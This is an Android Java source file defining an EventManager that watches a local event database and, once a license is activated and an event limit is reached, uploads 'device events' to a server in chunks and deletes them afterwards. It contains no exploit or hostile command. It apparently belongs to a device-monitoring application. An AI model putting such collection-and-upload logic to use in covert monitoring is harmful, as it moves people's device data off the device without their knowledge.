package com.fx.maind;

import java.util.List;

import android.content.Context;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;

import com.fx.event.Event;
import com.fx.eventdb.EventDatabaseManager;
import com.fx.eventdb.EventDatabaseMetadata;
import com.fx.license.LicenseManager;
import com.fx.maind.delivery.DeliveryState;
import com.fx.maind.delivery.UploadDeviceEvents;
import com.fx.maind.ref.Customization;
import com.fx.preference.PreferenceManager;
import com.fx.util.FxSettings;
import com.vvt.logger.FxLog;

public class EventManager implements UploadDeviceEvents.Callback {
	
	private static final String TAG = "EventManager";
	private static final boolean LOGV = Customization.VERBOSE;
	
	private static EventManager sInstance;
	
	private Context mContext;
	private PreferenceManager mPreferenceManager;
	private EventDatabaseManager mEventDbManager;
	private LicenseManager mLicenseManager;
	
	private DeliveryState mDeliveryState;
	private UploadDeviceEvents mEventsUploader;
	
	private EventManager(Context context) {
		mContext = context;
		
		mEventDbManager = EventDatabaseManager.getInstance(mContext);
		
		mPreferenceManager = PreferenceManager.getInstance(mContext);
		mLicenseManager = LicenseManager.getInstance(mContext);
		
		mEventsUploader = UploadDeviceEvents.getInstance(mContext);
		mEventsUploader.setCallback(this);
		
		mDeliveryState = new DeliveryState();
		
		startEventMonitoringThread();
	}
	
	public static EventManager getInstance(Context context) {
		if (sInstance == null) {
			sInstance = new EventManager(context);
		}
		return sInstance;
	}
	
	/**
	 * Check number of events and try delivery if NoE exceeds the limit.
	 */
	public void processNumberOfEvents() {
		if (! mLicenseManager.isActivated()) {
			if (LOGV) FxLog.v(TAG, "processNumberOfEvents # Product is not activated");
			return;
		}
		
		int maxEvents = mPreferenceManager.getMaxEvents();
		int numberOfEvents = mEventDbManager.countTotalEvents();
		
		FxLog.d(TAG, String.format(
				"processNumberOfEvents # Number of events: %d / %d", numberOfEvents, maxEvents));
		
		if (numberOfEvents >= maxEvents) {
			
			// I want to keep log above printed, so I do the test here
			if (mPreferenceManager.getDeliveryPeriodHours() < 1) {
				if (LOGV) {
					FxLog.v(TAG, "processNumberOfEvents # Delivery is disabled");
				}
				return;
			}
			
			FxLog.d(TAG, "processNumberOfEvents # Request deliver all events");
			asyncRequestDeliverAll();
		}
	}
	
	public void removeAllEvents() {
		if (LOGV) FxLog.v(TAG, "removeAllEvents # ENTER ...");
		mEventDbManager.removeAllEvents();
		if (LOGV) FxLog.v(TAG, "removeAllEvents # EXIT ...");
	}
	
	/**
	 * Requests to deliver all events in the cache database to the server. If another thread called 
	 * this method before but the uploading process has not finished, this method will do nothing 
	 * and return <code>false</code>. Otherwise, it will return <code>true</code>.
	 * 
	 * After delivering finishes, the successfully uploaded events will be removed from 
	 * the database.  
	 */
	public void asyncRequestDeliverAll() {
		if (LOGV) FxLog.v(TAG, "asyncRequestDeliverAll # ENTER ...");
		
		// We don't check for the Internet connection here
		// since we still need a connection history record at the end 
		
		if (LOGV) FxLog.v(TAG, String.format(
				"asyncRequestDeliverAll # isDelivering: %s", 
				mDeliveryState.isDelivering()));
		
		if (mDeliveryState.isDelivering()) {
			long deliveryDurationMilliseconds = mDeliveryState.getDeliveringTimeMilliseconds();
			if (LOGV) {
				FxLog.v(TAG, String.format(
						"asyncRequestDeliverAll # Delivery is in progress for %d ms", 
						deliveryDurationMilliseconds));
			}
			
			if (deliveryDurationMilliseconds <= FxSettings.getDeliveryAllTimeoutMilliseconds()) {
				if (LOGV) {
					FxLog.v(TAG, "asyncRequestDeliverAll # [EVENT-DELIVER] " +
							"Delivery duration is less than timeout, cancel this request.");
				}
				return;
			}
			
			if (LOGV) {
				FxLog.v(TAG, "asyncRequestDeliverAll # [EVENT-DELIVER] " +
						"Delivery duration is more than timeout, process this request.");
			}
		}
		
		mDeliveryState.setDelivering(true);
		
		if (LOGV) {
			FxLog.v(TAG, "asyncRequestDeliverAll # Request to deliver the first chunk.");
		}
		
		// Deliver a chunk, the next chunk will be requested from the callback logic (onSent()).
		asyncDeliverEventsChunk();
		
		if (LOGV) FxLog.v(TAG, "asyncRequestDeliverAll # EXIT ...");
	}
	
	/**
	 * Implementation of the interface {@link UploadDeviceEvents#Callback}. Will be called when 
	 * each events chunk sent.
	 */
	public void onSent(List<Event> sentDeviceEventsList) {
		if (LOGV) FxLog.v(TAG, "onSent # ENTER ...");
		
		int eventBeingSent = 0;
		if (sentDeviceEventsList != null) {
			eventBeingSent = sentDeviceEventsList.size();
		}
		
		if (LOGV) {
			FxLog.v(TAG, "\n**************************************************");
			FxLog.v(TAG, String.format(
					"onSent # [EVENT-DELIVER] Removing %d events from the database", 
					eventBeingSent));
			FxLog.v(TAG, "**************************************************\n");
		}
		remove(sentDeviceEventsList);
		
		int eventLeft = mEventDbManager.countTotalEvents();
		
		boolean continueDelivery = eventBeingSent > 0 && eventLeft > 0;
		
		FxLog.d(TAG, String.format(
				"onSent # eventBeingSent=%d, eventLeft=%d, continueDelivery? %s", 
				eventBeingSent, eventLeft, continueDelivery));
		
		if (continueDelivery) {
			asyncDeliverEventsChunk();
		}
		else {
			mDeliveryState.setDelivering(false);
		}
		
		if (LOGV) FxLog.v(TAG, "onSent # EXIT ...");
	}
	
	/**
	 * Delivery a fixing number of records to a server
	 * a fixing number will be retrieved from configurationManager.getNumberOfDeliveryEvents()
	 */
	private void asyncDeliverEventsChunk() {
		if (LOGV) FxLog.v(TAG, "asyncDeliverEventsChunk # ENTER ...");
		
		List<Event> eventsList = mEventDbManager.getEventsForDelivery();
		
		if (LOGV) {
			FxLog.v(TAG, "\n**************************************************");
			FxLog.v(TAG, String.format(
					"asyncDeliverEventsChunk # [EVENT-DELIVER] sending %d events", 
					eventsList.size()));
			FxLog.v(TAG, "**************************************************\n");
			
			for (Event deviceEvent : eventsList) {
				FxLog.v(TAG, String.format(
						"asyncDeliverEventsChunk # Sending -> %s", (deviceEvent).toString()));
       		}
		}
		
		// We need to call asyncSend() even if deviceEventsList has no members so that everything
		// will go to the same flow (e.g. the call back onSent will be call). 
		// asyncSend() is needed to be able to handle this case properly.
		mEventsUploader.asyncSend(eventsList);	
		
		if (LOGV) FxLog.v(TAG, "asyncDeliverEventsChunk # EXIT ...");
	}
	
	private void remove(List<Event> list) { 
		if (LOGV) FxLog.v(TAG, "remove # ENTER ...");
		mEventDbManager.remove(list);
		if (LOGV) FxLog.v(TAG, "remove # EXIT ...");
	}
	
	private void startEventMonitoringThread() {
		Thread monitoringThread = new Thread() {
			@Override
			public void run() {
				FxLog.d(TAG, "Events monitoring thread is started");
				
				Looper.prepare();
				
				Uri uri = Uri.parse(EventDatabaseMetadata.ROOT_URI);
				
				ContentObserver eventObserver = new ContentObserver(new Handler()) {
					@Override
					public void onChange(boolean selfChange) {
						if (LOGV) {
							FxLog.v(TAG, "onChange # Found changes in EventDatabase");
						}
						processNumberOfEvents();
					}
				};
				
				mContext.getContentResolver().registerContentObserver(uri, true, eventObserver);
				
				Looper.loop();
			}
		};
		
		monitoringThread.start();
	}
	
}
